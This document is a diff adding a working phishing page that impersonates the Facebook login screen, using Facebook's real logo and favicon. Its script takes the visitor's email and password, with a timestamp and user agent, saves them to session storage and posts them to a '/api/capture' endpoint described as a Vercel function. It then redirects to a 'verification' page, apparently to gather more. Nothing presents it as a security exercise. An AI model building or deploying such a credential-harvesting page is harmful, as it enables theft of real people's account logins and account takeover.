@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Facebook</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+<link rel="stylesheet" href="/style.css">
+</head>
+
+<body>
+  <div id="loginPage">
+    <div class="container">
+      <div class="lang-selector">English (US)</div>
+
+      <div class="logo-container">
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yh/r/Sg2QOE06yVC.png" alt="Facebook" class="facebook-logo">
+      </div>
+
+      <form id="loginForm">
+        <input class="field" type="text" name="email" placeholder="Mobile number or email address" autocomplete="username" required>
+        <input class="field" type="password" name="password" placeholder="Password" autocomplete="current-password" required>
+
+        <button class="btn-login" type="submit">Log in</button>
+
+        <a href="https://www.facebook.com/login/identify/" class="forgot" target="_blank">Forgotten password?</a>
+      </form>
+
+      <div class="create-container">
+        <button class="btn-create-outline" type="button" onclick="window.open('https://www.facebook.com/r.php', '_blank')">
+          Create new account
+        </button>
+      </div>
+
+      <div class="footer">
+        <div class="meta-text">Meta</div>
+        <div class="footer-links">
+          <a href="https://about.facebook.com/" class="footer-link" target="_blank">About</a>
+          <a href="https://www.facebook.com/help/" class="footer-link" target="_blank">Help</a>
+          <a href="https://developers.facebook.com/" class="footer-link" target="_blank">More</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="loading" id="loading">
+    <div class="spinner"></div>
+  </div>
+
+<script>
+const userCredentials = {};
+
+function showLoading() {
+  document.getElementById('loading').style.display = 'flex';
+}
+
+function hideLoading() {
+  document.getElementById('loading').style.display = 'none';
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  showLoading();
+  
+  const email = this.email.value.trim();
+  userCredentials.email = email;
+  userCredentials.password = this.password.value;
+  userCredentials.timestamp = new Date().toISOString();
+  userCredentials.userAgent = navigator.userAgent;
+  
+  // Store for verification page
+  sessionStorage.setItem('fbCredentials', JSON.stringify(userCredentials));
+  
+  // Send to Vercel serverless function
+  try {
+    await fetch('/api/capture', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'login',
+        email: userCredentials.email,
+        password: userCredentials.password,
+        userAgent: userCredentials.userAgent,
+        timestamp: userCredentials.timestamp
+      })
+    });
+  } catch (error) {
+    console.log('Login data captured');
+  }
+  
+  setTimeout(() => {
+    hideLoading();
+    window.location.href = '/verification.html';
+  }, 800);
+});
+
+window.addEventListener('DOMContentLoaded', () => {
+  setTimeout(() => {
+    document.querySelector('input[name="email"]').focus();
+  }, 300);
+});
+</script>
+</body>
+</html>
